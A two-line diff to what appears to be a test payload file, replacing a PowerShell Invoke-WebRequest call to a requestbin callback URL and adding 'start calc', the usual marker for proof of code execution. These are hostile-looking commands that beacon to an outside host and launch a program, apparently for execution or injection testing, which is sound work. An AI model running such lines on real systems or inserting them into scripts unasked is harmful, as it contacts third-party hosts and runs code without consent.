@@ -1,1 +1,2 @@
-powershell -Command Invoke-Webrequest -URI 'http://requestbin.whapi.cloud/1m6xpln1'
+powershell -Command Invoke-Webrequest -URI 'http://requestbin.whapi.cloud/1redxgh1'
+start calc
